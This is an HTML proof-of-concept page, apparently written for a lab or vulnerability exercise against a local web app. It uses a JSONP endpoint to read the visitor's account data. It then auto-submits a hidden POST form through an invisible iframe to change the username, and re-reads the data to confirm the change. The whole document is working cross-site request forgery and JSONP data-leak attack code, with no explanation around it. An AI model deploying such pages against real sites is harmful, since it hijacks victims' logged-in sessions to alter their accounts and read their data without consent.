<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
  <iframe name="hiddenFrame" style="display:none;"></iframe>
  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame">
    <input type="hidden" name="new_username" value="wildspruce">
  </form>

  <script>
    function exploit(data) {
      console.log("[EXPLOIT] User data BEFORE:", data);
      document.body.innerHTML += '<h1 style="color:red;">EXPLOIT STARTED</h1>';
      document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';

      console.log("[EXPLOIT] Step 1: Navigate to #/sheets");
      window.location.hash = '#/sheets';

      setTimeout(() => {
        console.log("[EXPLOIT] Step 2: Submitting POST form");
        document.getElementById('postForm').submit();
        document.body.innerHTML += '<h2>POST SUBMITTED</h2>';

        setTimeout(() => {
          window.checkResult = function(updatedData) {
            console.log("[EXPLOIT] User data AFTER:", updatedData);
            document.body.innerHTML += '<h2 style="color:green;">Username after: ' + updatedData.username + '</h2>';

            console.log("[EXPLOIT] Step 4: Navigate to #/settings");
            window.location.hash = '#/settings';
            document.body.innerHTML += '<h2>NAVIGATED TO SETTINGS</h2>';
          };

          const script = document.createElement('script');
          script.src = 'http://localhost:8000/api/whoami/jsonp?callback=checkResult';
          document.body.appendChild(script);
        }, 1000);
      }, 1000);
    }
  </script>

  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
</body>
</html>
